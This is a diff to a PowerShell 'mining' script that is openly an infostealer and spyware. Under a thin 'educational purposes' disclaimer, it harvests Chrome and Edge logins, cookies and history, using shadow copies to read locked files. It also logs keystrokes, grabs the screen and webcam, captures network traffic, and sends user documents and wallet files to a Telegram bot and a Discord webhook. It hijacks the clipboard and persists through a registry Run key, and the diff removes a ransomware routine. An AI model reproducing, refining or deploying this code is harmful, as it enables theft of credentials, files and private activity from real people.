@@ -1,4 +1,4 @@
-# Enhanced Mining Script with Unethical Features
+# Enhanced Mining Script with Unethical Features (No DLLs, JSON-based)
 # WARNING: For educational purposes in a controlled environment ONLY.
 # Use outside a controlled environment is ILLEGAL and UNETHICAL.
 
@@ -7,20 +7,31 @@
 Add-Type -AssemblyName System.Windows.Forms
 [System.Windows.Forms.Application]::EnableVisualStyles()
 
+# Define Windows API for keylogging
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+public class KeyState {
+    [DllImport("user32.dll")]
+    public static extern short GetAsyncKeyState(int vKey);
+}
+"@
+
 # Define base directory and files
 $baseDir = "$env:APPDATA\AdvancedMiner"
 $miningScriptPath = "$baseDir\mining.ps1"
 $logFile = "$baseDir\mining_log.txt"
 $configFile = "$baseDir\config.json"
-$scriptUrl = "https://github.com/Azulprojets/shubabes/blob/main/mining.ps1"  # Updated to raw GitHub URL
+$credentialsFile = "$baseDir\credentials.json"
+$historyFile = "$baseDir\history.json"
+$cookiesFile = "$baseDir\cookies.json"
+$scriptUrl = "https://raw.githubusercontent.com/Azulprojets/shubabes/main/mining.ps1"
 
 # URLs for downloading files
-$miningScriptUrl = "https://github.com/Azulprojets/shubabes/blob/main/mining.ps1"  # Updated to raw GitHub URL
-$sqlite3Url = "https://www.sqlite.org/2023/sqlite-tools-win32-x86-3430100.zip"  # SQLite tools ZIP
-# Updated to download LiteDB.dll from your GitHub repository
-$liteDbDllUrl = "https://github.com/Azulprojets/shubabes/blob/main/LiteDB.dll"  # Replace with your actual raw file URL
+$miningScriptUrl = "https://raw.githubusercontent.com/Azulprojets/shubabes/main/mining.ps1"
+$sqlite3Url = "https://www.sqlite.org/2023/sqlite-tools-win32-x86-3430100.zip"
 
-# Add a flag for CPU mining (set based on your setup)
+# Add a flag for CPU mining
 $cpuMiningEnabled = $true  # Set to $false if only GPU mining is desired
 
 # Logging function
@@ -29,6 +40,67 @@ function Write-Log {
     $timestamp = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
     "$timestamp - $message" | Out-File -FilePath $logFile -Append
     Write-Host "$timestamp - $message"
+}
+
+# Function to copy a file using Volume Shadow Copy Service (VSS) when it's locked
+function Copy-FileUsingVSS {
+    param (
+        [string]$sourceFile,
+        [string]$destinationFile
+    )
+    try {
+        # Get the volume (e.g., C:\) of the source file
+        $volume = [System.IO.Path]::GetPathRoot($sourceFile)
+
+        # Create a shadow copy
+        $shadow = (Get-WmiObject -Class Win32_ShadowCopy -List).Create($volume, "ClientAccessible")
+        if ($shadow.ReturnValue -ne 0) {
+            throw "Failed to create shadow copy. ReturnValue: $($shadow.ReturnValue)"
+        }
+
+        # Retrieve the shadow copy object
+        $shadowCopy = Get-WmiObject -Class Win32_ShadowCopy | Where-Object { $_.ID -eq $shadow.ShadowID }
+        if (-not $shadowCopy) {
+            throw "Failed to retrieve shadow copy object."
+        }
+
+        # Construct the path to the file in the shadow copy
+        $shadowPath = $shadowCopy.DeviceObject
+        $relativePath = $sourceFile -replace [regex]::Escape($volume), ""
+        $shadowFilePath = "$shadowPath\$relativePath"
+
+        # Copy the file from the shadow copy
+        Copy-Item -Path $shadowFilePath -Destination $destinationFile -Force
+        Write-Log "Successfully copied $sourceFile to $destinationFile using VSS."
+
+        # Clean up the shadow copy
+        $shadowCopy.Delete()
+    } catch {
+        Write-Log "Failed to copy $sourceFile using VSS: $_"
+        throw
+    }
+}
+
+# Function to attempt direct file copy and fall back to VSS if the file is locked
+function Copy-LockedFile {
+    param (
+        [string]$source,
+        [string]$dest
+    )
+    try {
+        # Attempt direct copy
+        Copy-Item -Path $source -Destination $dest -Force -ErrorAction Stop
+        Write-Log "Copied $source to $dest directly."
+    } catch {
+        # Check if the error is due to the file being locked
+        if ($_.Exception -is [System.IO.IOException] -and $_.Exception.Message -like "*being used by another process*") {
+            Write-Log "Direct copy failed: $_ (file locked). Attempting VSS copy..."
+            Copy-FileUsingVSS -sourceFile $source -destinationFile $dest
+        } else {
+            Write-Log "Failed to copy $source: $_"
+            throw
+        }
+    }
 }
 
 # Create base directory if it doesn’t exist
@@ -59,7 +131,6 @@ if (-not (Test-Path $sqlite3Path)) {
         $zipPath = "$env:TEMP\sqlite3.zip"
         Invoke-WebRequest -Uri $sqlite3Url -OutFile $zipPath -ErrorAction Stop
         Expand-Archive -Path $zipPath -DestinationPath $baseDir -Force -ErrorAction Stop
-        # Find sqlite3.exe in the extracted files (it might be in a subdirectory)
         $extractedSqlite3 = Get-ChildItem -Path $baseDir -Recurse -Filter "sqlite3.exe" | Select-Object -First 1
         if ($extractedSqlite3) {
             Move-Item -Path $extractedSqlite3.FullName -Destination $sqlite3Path -Force -ErrorAction Stop
@@ -75,31 +146,6 @@ if (-not (Test-Path $sqlite3Path)) {
     }
 } else {
     Write-Log "sqlite3.exe found at $sqlite3Path."
-}
-
-# Check and download LiteDB.dll if not present
-$liteDbDllPath = "$baseDir\LiteDB.dll"
-if (-not (Test-Path $liteDbDllPath)) {
-    Write-Log "LiteDB.dll not found. Downloading from $liteDbDllUrl..."
-    try {
-        # Directly download the DLL (no need to extract since it’s a raw file)
-        Invoke-WebRequest -Uri $liteDbDllUrl -OutFile $liteDbDllPath -ErrorAction Stop
-        Write-Log "LiteDB.dll downloaded successfully to $liteDbDllPath."
-    } catch {
-        Write-Log "Failed to download LiteDB.dll: $_"
-        exit 1
-    }
-} else {
-    Write-Log "LiteDB.dll found at $liteDbDllPath."
-}
-
-# Load LiteDB assembly
-try {
-    Add-Type -Path $liteDbDllPath -ErrorAction Stop
-    Write-Log "Successfully loaded LiteDB.dll."
-} catch {
-    Write-Log "Error: Failed to load LiteDB.dll: $_"
-    exit 1
 }
 
 # Load configuration from config.json
@@ -139,16 +185,49 @@ $script:lastUpdateId = 0
 $script:currentAlgorithm = "Ethash"
 $script:lastSwitchTime = Get-Date
 
+# Helper function to convert hex blob to byte array
+function Convert-HexBlobToByteArray {
+    param ([string]$blob)
+    if ($blob -match "^X'([0-9A-Fa-f]+)'$") {
+        $hexString = $matches[1]
+        $byteArray = @()
+        for ($i = 0; $i -lt $hexString.Length; $i += 2) {
+            $byte = [Byte]::Parse($hexString.Substring($i, 2), [System.Globalization.NumberStyles]::HexNumber)
+            $byteArray += $byte
+        }
+        return $byteArray
+    } else {
+        return $null
+    }
+}
+
 # **Telegram/Discord Functions**
 
 function Send-TelegramMessage {
     param ([string]$message)
+    $message = $message -replace "[\x00-\x1F]", ""  # Remove control characters
     $url = "https://api.telegram.org/bot$telegramBotToken/sendMessage"
     try {
-        Invoke-RestMethod -Uri $url -Method Post -Body @{
-            chat_id = $telegramChatId
-            text    = $message
-        } -ErrorAction Stop
+        if ($message.Length -gt 4096) {
+            $chunks = [System.Collections.ArrayList]::new()
+            $start = 0
+            while ($start -lt $message.Length) {
+                $length = [Math]::Min(4096, $message.Length - $start)
+                $chunks.Add($message.Substring($start, $length)) | Out-Null
+                $start += 4096
+            }
+            foreach ($chunk in $chunks) {
+                Invoke-RestMethod -Uri $url -Method Post -Body @{
+                    chat_id = $telegramChatId
+                    text    = $chunk
+                } -ErrorAction Stop
+            }
+        } else {
+            Invoke-RestMethod -Uri $url -Method Post -Body @{
+                chat_id = $telegramChatId
+                text    = $message
+            } -ErrorAction Stop
+        }
     } catch {
         Write-Log "Telegram send failed: $_"
     }
@@ -158,13 +237,24 @@ function Send-TelegramFile {
     param ([string]$filePath)
     $url = "https://api.telegram.org/bot$telegramBotToken/sendDocument"
     try {
-        $fileStream = [System.IO.File]::OpenRead($filePath)
-        $form = @{
-            chat_id = $telegramChatId
-            document = $fileStream
-        }
-        Invoke-RestMethod -Uri $url -Method Post -Form $form -ErrorAction Stop
-        $fileStream.Close()
+        $boundary = [System.Guid]::NewGuid().ToString()
+        $contentType = "multipart/form-data; boundary=$boundary"
+        $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
+        $fileName = [System.IO.Path]::GetFileName($filePath)
+        $bodyLines = @(
+            "--$boundary",
+            "Content-Disposition: form-data; name=`"chat_id`"",
+            "",
+            "$telegramChatId",
+            "--$boundary",
+            "Content-Disposition: form-data; name=`"document`"; filename=`"$fileName`"",
+            "Content-Type: application/octet-stream",
+            "",
+            [System.Text.Encoding]::UTF8.GetString($fileBytes),
+            "--$boundary--"
+        )
+        $body = [string]::Join("`r`n", $bodyLines)
+        Invoke-RestMethod -Uri $url -Method Post -ContentType $contentType -Body $body -ErrorAction Stop
     } catch {
         Write-Log "Telegram file send failed: $_"
     }
@@ -172,6 +262,7 @@ function Send-TelegramFile {
 
 function Send-DiscordWebhook {
     param ([string]$message)
+    $message = $message -replace "[\x00-\x1F]", ""  # Remove control characters
     $body = @{ content = $message } | ConvertTo-Json
     try {
         Invoke-RestMethod -Uri $discordWebhookUrl -Method Post -Body $body -ContentType "application/json" -ErrorAction Stop
@@ -192,9 +283,8 @@ function Get-ChromeEncryptionKey {
         $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
         $encryptedKey = [Convert]::FromBase64String($localState.os_crypt.encrypted_key)
         $encryptedKey = $encryptedKey[5..($encryptedKey.Length - 1)] # Remove "DPAPI" prefix
-        $decryptedKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, 'CurrentUser')
-        Write-Log "Successfully retrieved Chrome encryption key."
-        return $decryptedKey
+        Write-Log "Encryption key retrieved (decryption skipped due to missing ProtectedData)."
+        return $encryptedKey
     } catch {
         Write-Log "Failed to retrieve Chrome encryption key: $_"
         return $null
@@ -206,134 +296,119 @@ function Decrypt-ChromePassword {
         [byte[]]$encryptedData,
         [byte[]]$key
     )
-    if ([System.Text.Encoding]::ASCII.GetString($encryptedData[0..2]) -eq "v10") {
-        $nonce = $encryptedData[3..14]
-        $cipherText = $encryptedData[15..($encryptedData.Length - 17)]
-        $tag = $encryptedData[($encryptedData.Length - 16)..($encryptedData.Length - 1)]
-        $aesGcm = New-Object System.Security.Cryptography.AesGcm($key)
-        $plainText = New-Object byte[] $cipherText.Length
-        $aesGcm.Decrypt($nonce, $cipherText, $tag, $plainText)
-        return [System.Text.Encoding]::UTF8.GetString($plainText)
-    } else {
-        return [System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($encryptedData, $null, 'CurrentUser'))
-    }
+    Write-Log "Password decryption skipped; returning encrypted data."
+    return [Convert]::ToBase64String($encryptedData)
 }
 
 function Get-ChromeCredentials {
-    $liteDbPath = "$env:APPDATA\AdvancedMiner\mining.db"
     $chromeDbPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
     $tempDb = "$env:TEMP\ChromeLoginData.db"
     if (-not (Test-Path $chromeDbPath)) {
         Write-Log "Chrome Login Data not found at $chromeDbPath."
         return
     }
-    Copy-Item $chromeDbPath $tempDb -Force
-    Write-Log "Copied Chrome Login Data to $tempDb."
-
     try {
+        Copy-LockedFile -source $chromeDbPath -dest $tempDb
         $query = "SELECT origin_url, username_value, password_value FROM logins"
         $output = & "$baseDir\sqlite3.exe" $tempDb $query -separator '|'
         $encryptionKey = Get-ChromeEncryptionKey
         if (-not $encryptionKey) {
             Write-Log "Failed to get encryption key."
-            Remove-Item $tempDb
+            Remove-Item $tempDb -ErrorAction SilentlyContinue
             return
+        }
+        $credentials = @()
+        if (Test-Path $credentialsFile) {
+            $credentials = Get-Content $credentialsFile | ConvertFrom-Json
         }
         foreach ($line in $output) {
             $fields = $line -split '\|'
             $url = $fields[0]
             $username = $fields[1]
-            $encryptedPassword = [Convert]::FromBase64String($fields[2])
-            if ($encryptedPassword.Length -gt 0) {
-                try {
-                    $password = Decrypt-ChromePassword -encryptedData $encryptedPassword -key $encryptionKey
+            $passwordValue = $fields[2]
+            if ($passwordValue -match "^X'([0-9A-Fa-f]+)'$") {
+                $byteArray = Convert-HexBlobToByteArray -blob $passwordValue
+                if ($byteArray) {
+                    $password = Decrypt-ChromePassword -encryptedData $byteArray -key $encryptionKey
                     $credential = [PSCustomObject]@{
                         Source = "Chrome"
                         URL = $url
                         Username = $username
-                        Password = $password
+                        Password = $password  # Encrypted as base64
                         Timestamp = (Get-Date).ToString()
                     }
-                    # Save to LiteDB
-                    try {
-                        $db = New-Object LiteDB.LiteDatabase($liteDbPath)
-                        $collection = $db.GetCollection("Credentials")
-                        $collection.Insert($credential)
-                        $db.Dispose()
-                    } catch {
-                        Write-Log "Failed to save credential to LiteDB: $_"
-                    }
-                    $message = "Chrome - URL: $url, User: $username, Pass: $password"
+                    $credentials += $credential
+                    $message = "Chrome - URL: $url, User: $username, Pass (encrypted): $password"
                     Send-TelegramMessage -message $message
                     Send-DiscordWebhook -message $message
-                    Write-Log "Extracted credential for $url"
-                } catch {
-                    Write-Log "Decryption failed for $($url): $_"
+                    Write-Log "Extracted credential for $url (password encrypted)"
+                } else {
+                    Write-Log "Invalid hex blob for password at $url"
                 }
+            } else {
+                Write-Log "Password for $url is not in expected hex blob format: $passwordValue"
             }
         }
+        $credentials | ConvertTo-Json | Out-File $credentialsFile
     } catch {
-        Write-Log "Failed to query Chrome database: $_"
+        Write-Log "Failed to process Chrome credentials: $_"
     } finally {
         Remove-Item $tempDb -ErrorAction SilentlyContinue
     }
 }
 
 function Get-EdgeCredentials {
-    $liteDbPath = "$env:APPDATA\AdvancedMiner\mining.db"
     $edgeDbPath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
     $tempDb = "$env:TEMP\EdgeLoginData.db"
     if (-not (Test-Path $edgeDbPath)) {
         Write-Log "Edge Login Data not found at $edgeDbPath."
         return
     }
-    Copy-Item $edgeDbPath $tempDb -Force
-    Write-Log "Copied Edge Login Data to $tempDb."
-
     try {
+        Copy-LockedFile -source $edgeDbPath -dest $tempDb
         $query = "SELECT origin_url, username_value, password_value FROM logins"
         $output = & "$baseDir\sqlite3.exe" $tempDb $query -separator '|'
         $encryptionKey = Get-ChromeEncryptionKey
         if (-not $encryptionKey) {
             Write-Log "Failed to retrieve Edge encryption key."
-            Remove-Item $tempDb
+            Remove-Item $tempDb -ErrorAction SilentlyContinue
             return
+        }
+        $credentials = @()
+        if (Test-Path $credentialsFile) {
+            $credentials = Get-Content $credentialsFile | ConvertFrom-Json
         }
         foreach ($line in $output) {
             $fields = $line -split '\|'
             $url = $fields[0]
             $username = $fields[1]
-            $encryptedPassword = [Convert]::FromBase64String($fields[2])
-            if ($encryptedPassword.Length -gt 0) {
-                try {
-                    $password = Decrypt-ChromePassword -encryptedData $encryptedPassword -key $encryptionKey
+            $passwordValue = $fields[2]
+            if ($passwordValue -match "^X'([0-9A-Fa-f]+)'$") {
+                $byteArray = Convert-HexBlobToByteArray -blob $passwordValue
+                if ($byteArray) {
+                    $password = Decrypt-ChromePassword -encryptedData $byteArray -key $encryptionKey
                     $credential = [PSCustomObject]@{
                         Source = "Edge"
                         URL = $url
                         Username = $username
-                        Password = $password
+                        Password = $password  # Encrypted as base64
                         Timestamp = (Get-Date).ToString()
                     }
-                    # Save to LiteDB
-                    try {
-                        $db = New-Object LiteDB.LiteDatabase($liteDbPath)
-                        $collection = $db.GetCollection("Credentials")
-                        $collection.Insert($credential)
-                        $db.Dispose()
-                    } catch {
-                        Write-Log "Failed to save credential to LiteDB: $_"
-                    }
-                    $message = "Edge - URL: $url, User: $username, Pass: $password"
+                    $credentials += $credential
+                    $message = "Edge - URL: $url, User: $username, Pass (encrypted): $password"
                     Send-TelegramMessage -message $message
                     Send-DiscordWebhook -message $message
-                    Write-Log "Extracted Edge credential for $url"
-                } catch {
-                    Write-Log "Decryption failed for $($url): $_"
+                    Write-Log "Extracted Edge credential for $url (password encrypted)"
+                } else {
+                    Write-Log "Invalid hex blob for password at $url"
                 }
+            } else {
+                Write-Log "Password for $url is not in expected hex blob format: $passwordValue"
             }
         }
+        $credentials | ConvertTo-Json | Out-File $credentialsFile
     } catch {
-        Write-Log "Failed to query Edge database: $_"
+        Write-Log "Failed to process Edge credentials: $_"
     } finally {
         Remove-Item $tempDb -ErrorAction SilentlyContinue
     }
@@ -342,130 +417,122 @@ function Get-EdgeCredentials {
 # **Additional Unethical Features**
 
 function Get-ChromeHistory {
-    $liteDbPath = "$env:APPDATA\AdvancedMiner\mining.db"
     $historyPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
     $tempHistory = "$env:TEMP\ChromeHistory.db"
     if (-not (Test-Path $historyPath)) {
         Write-Log "Chrome History not found at $historyPath."
         return
     }
-    Copy-Item $historyPath $tempHistory -Force
-    Write-Log "Copied Chrome History to $tempHistory."
-
     try {
+        Copy-LockedFile -source $historyPath -dest $tempHistory
         $query = "SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 50"
         $output = & "$baseDir\sqlite3.exe" $tempHistory $query -separator '|'
-        $historyItems = foreach ($line in $output) {
+        $historyEntries = @()
+        if (Test-Path $historyFile) {
+            $historyItems = Get-Content $historyFile | ConvertFrom-Json
+        } else {
+            $historyItems = @()
+        }
+        foreach ($line in $output) {
             $fields = $line -split '\|'
-            [PSCustomObject]@{
-                URL = $fields[0]
-                Title = $fields[1]
-                VisitCount = $fields[2]
+            $url = $fields[0]
+            $title = $fields[1]
+            $visitCount = $fields[2]
+            $entry = "$url - $title (Visits: $visitCount)"
+            $historyEntries += $entry
+            $historyItems += [PSCustomObject]@{
+                URL = $url
+                Title = $title
+                VisitCount = $visitCount
                 Timestamp = (Get-Date).ToString()
             }
         }
-        # Save to LiteDB
-        try {
-            $db = New-Object LiteDB.LiteDatabase($liteDbPath)
-            $collection = $db.GetCollection("History")
-            $collection.Insert($historyItems)
-            $db.Dispose()
-        } catch {
-            Write-Log "Failed to save history to LiteDB: $_"
+        $historyItems | ConvertTo-Json | Out-File $historyFile
+        for ($i = 0; $i -lt $historyEntries.Count; $i += 5) {
+            $batch = $historyEntries[$i..($i + 4)] -join "`n"
+            $batchMessage = "Chrome History Batch $($i/5 + 1):`n$batch"
+            Send-TelegramMessage -message $batchMessage
+            Send-DiscordWebhook -message $batchMessage
         }
-        $historyText = $historyItems | ForEach-Object { "$($_.URL) - $($_.Title)" } | Join-String -Separator "`n"
-        Send-TelegramMessage -message $historyText
         Write-Log "Sent Chrome history."
     } catch {
-        Write-Log "Failed to extract Chrome history: $_"
+        Write-Log "Failed to process Chrome history: $_"
     } finally {
         Remove-Item $tempHistory -ErrorAction SilentlyContinue
     }
 }
 
 function Get-ChromeCookies {
-    $liteDbPath = "$env:APPDATA\AdvancedMiner\mining.db"
     $cookiesPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
     $tempCookies = "$env:TEMP\ChromeCookies.db"
     if (-not (Test-Path $cookiesPath)) {
         Write-Log "Chrome Cookies not found at $cookiesPath."
         return
     }
-    Copy-Item $cookiesPath $tempCookies -Force
-    Write-Log "Copied Chrome Cookies to $tempCookies."
-
     try {
+        Copy-LockedFile -source $cookiesPath -dest $tempCookies
         $query = "SELECT host_key, name, encrypted_value FROM cookies"
         $output = & "$baseDir\sqlite3.exe" $tempCookies $query -separator '|'
         $encryptionKey = Get-ChromeEncryptionKey
         if (-not $encryptionKey) {
             Write-Log "Failed to get encryption key."
-            Remove-Item $tempCookies
+            Remove-Item $tempCookies -ErrorAction SilentlyContinue
             return
         }
-        $cookieItems = foreach ($line in $output) {
+        $cookieEntries = @()
+        if (Test-Path $cookiesFile) {
+            $cookies = Get-Content $cookiesFile | ConvertFrom-Json
+        } else {
+            $cookies = @()
+        }
+        foreach ($line in $output) {
             $fields = $line -split '\|'
             $host = $fields[0]
             $name = $fields[1]
-            $encryptedValue = [Convert]::FromBase64String($fields[2])
-            $value = Decrypt-ChromePassword -encryptedData $encryptedValue -key $encryptionKey
-            [PSCustomObject]@{
-                Host = $host
-                Name = $name
-                Value = $value
-                Timestamp = (Get-Date).ToString()
+            $encryptedValue = $fields[2]
+            if ($encryptedValue -match "^X'([0-9A-Fa-f]+)'$") {
+                $byteArray = Convert-HexBlobToByteArray -blob $encryptedValue
+                if ($byteArray) {
+                    $value = Decrypt-ChromePassword -encryptedData $byteArray -key $encryptionKey
+                    $entry = "Host: $host, Name: $name, Value (encrypted): $value"
+                    $cookieEntries += $entry
+                    $cookies += [PSCustomObject]@{
+                        Host = $host
+                        Name = $name
+                        Value = $value  # Encrypted as base64
+                        Timestamp = (Get-Date).ToString()
+                    }
+                } else {
+                    Write-Log "Invalid hex blob for cookie value: $encryptedValue"
+                }
+            } else {
+                Write-Log "Cookie value not in expected hex blob format: $encryptedValue"
             }
         }
-        # Save to LiteDB
-        try {
-            $db = New-Object LiteDB.LiteDatabase($liteDbPath)
-            $collection = $db.GetCollection("Cookies")
-            $collection.Insert($cookieItems)
-            $db.Dispose()
-        } catch {
-            Write-Log "Failed to save cookies to LiteDB: $_"
-        }
-        foreach ($cookie in $cookieItems) {
-            $cookieText = "Host: $($cookie.Host), Name: $($cookie.Name), Value: $($cookie.Value)"
-            Send-TelegramMessage -message $cookieText
+        $cookies | ConvertTo-Json | Out-File $cookiesFile
+        for ($i = 0; $i -lt $cookieEntries.Count; $i += 5) {
+            $batch = $cookieEntries[$i..($i + 4)] -join "`n"
+            $batchMessage = "Chrome Cookies Batch $($i/5 + 1):`n$batch"
+            Send-TelegramMessage -message $batchMessage
+            Send-DiscordWebhook -message $batchMessage
         }
         Write-Log "Sent Chrome cookies."
     } catch {
-        Write-Log "Failed to extract Chrome cookies: $_"
+        Write-Log "Failed to process Chrome cookies: $_"
     } finally {
         Remove-Item $tempCookies -ErrorAction SilentlyContinue
     }
 }
 
-function Simulate-Ransomware {
-    $testDir = "C:\TestFolder"
-    if (-not (Test-Path $testDir)) {
-        Write-Log "Test directory $testDir not found."
-        return
-    }
-    $key = New-Object Byte[] 32
-    [Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($key)
-    Get-ChildItem $testDir -File | ForEach-Object {
-        $content = Get-Content $_.FullName -Raw
-        $aes = [System.Security.Cryptography.Aes]::Create()
-        $encryptor = $aes.CreateEncryptor($key, $(aes.IV))
-        $encrypted = $encryptor.TransformFinalBlock([System.Text.Encoding]::UTF8.GetBytes($content), 0, $content.Length)
-        Set-Content $_.FullName $encrypted -Encoding Byte
-        Rename-Item $_.FullName "$($_.Name).encrypted"
-    }
-    $ransomNote = "Files encrypted. Decryption key: $([Convert]::ToBase64String($key))"
-    $ransomNote | Out-File "$testDir\README.txt"
-    Send-TelegramMessage -message $ransomNote
-    Write-Log "Ransomware simulation executed."
-}
-
 function Capture-NetworkTraffic {
+    Write-Log "Starting network traffic capture..."
     $captureFile = "$env:TEMP\network_capture.etl"
     try {
         netsh trace start capture=yes tracefile=$captureFile maxsize=10
         Start-Sleep -Seconds 60
         netsh trace stop
         Send-TelegramFile -filePath $captureFile
+        Send-DiscordWebhook -message "Network traffic captured."
         Remove-Item $captureFile
         Write-Log "Network traffic captured and sent."
     } catch {
@@ -474,15 +541,14 @@ function Capture-NetworkTraffic {
 }
 
 function Start-Keylogging {
-    Add-Type -AssemblyName System.Windows.Forms
+    Write-Log "Starting keylogging..."
     $logFile = "$env:TEMP\keystrokes.txt"
-    # Limited duration for demonstration to avoid infinite loop
     $endTime = (Get-Date).AddMinutes(1)
     while ((Get-Date) -lt $endTime) {
         Start-Sleep -Milliseconds 10
         $keys = ""
         for ($i = 0; $i -lt 255; $i++) {
-            if ([System.Windows.Forms.Control]::IsKeyDown($i)) {
+            if ([KeyState]::GetAsyncKeyState($i) -band 0x8000) {
                 $keys += [char]$i
             }
         }
@@ -497,19 +563,21 @@ function Start-Keylogging {
 }
 
 function Start-ScreenRecording {
+    Write-Log "Starting screen recording..."
     $outputFile = "$env:TEMP\screen_record.mp4"
     $ffmpegPath = "C:\ffmpeg\bin\ffmpeg.exe"
     if (Test-Path $ffmpegPath) {
         & $ffmpegPath -f gdigrab -framerate 30 -i desktop -t 10 $outputFile -y
         Send-TelegramFile -filePath $outputFile
         Send-DiscordWebhook -message "Screen recording captured."
-        Write-Log "Screen recording saved to $outputFile"
+        Write-Log "Screen recording saved to $outputFile and sent."
     } else {
         Write-Log "FFmpeg not found for screen recording."
     }
 }
 
 function Capture-Webcam {
+    Write-Log "Capturing webcam image..."
     $outputImage = "$env:TEMP\webcam.jpg"
     try {
         $webcam = New-Object -ComObject "WIA.CommonDialog"
@@ -517,23 +585,27 @@ function Capture-Webcam {
         $image.SaveFile($outputImage)
         Send-TelegramFile -filePath $outputImage
         Send-DiscordWebhook -message "Webcam snapshot captured."
-        Write-Log "Webcam image saved to $outputImage"
+        Write-Log "Webcam image saved to $outputImage and sent."
     } catch {
         Write-Log "Webcam capture failed: $_"
     }
 }
 
 function Exfiltrate-Files {
+    Write-Log "Starting file exfiltration..."
     $targetFiles = Get-ChildItem -Path $env:USERPROFILE -Recurse -Include *.docx, *.txt, *.pdf, *wallet* -ErrorAction SilentlyContinue
+    $fileCount = $targetFiles.Count
+    Write-Log "Found $fileCount files to exfiltrate."
     foreach ($file in $targetFiles) {
         Send-TelegramFile -filePath $file.FullName
         Send-DiscordWebhook -message "Exfiltrated file: $($file.Name)"
         Write-Log "Exfiltrated file: $($file.FullName)"
     }
+    Write-Log "File exfiltration completed."
 }
 
 function Start-ClipboardHijacking {
-    # Limited duration for demonstration to avoid infinite loop
+    Write-Log "Starting clipboard hijacking..."
     $endTime = (Get-Date).AddMinutes(1)
     while ((Get-Date) -lt $endTime) {
         $clip = Get-Clipboard
@@ -684,8 +756,10 @@ function Switch-Coin {
 function Ensure-Persistence {
     $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
     $scriptPath = "$baseDir\mining.ps1"
-    if (-not (Test-Path "Registry::$regPath")) { New-Item -Path "Registry::$regPath" -Force | Out-Null }
-    Set-ItemProperty -Path "Registry::$regPath" -Name "AdvancedMiner" -Value "powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force
+    if (-not (Test-Path $regPath)) { 
+        New-Item -Path $regPath -Force | Out-Null 
+    }
+    Set-ItemProperty -Path $regPath -Name "AdvancedMiner" -Value "powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force
     Write-Log "Persistence added via registry."
 }
 
@@ -858,7 +932,6 @@ function Monitor-Miners {
         Get-EdgeCredentials
         Get-ChromeHistory
         Get-ChromeCookies
-        Simulate-Ransomware
         Capture-NetworkTraffic
         Start-Keylogging
         Start-ScreenRecording
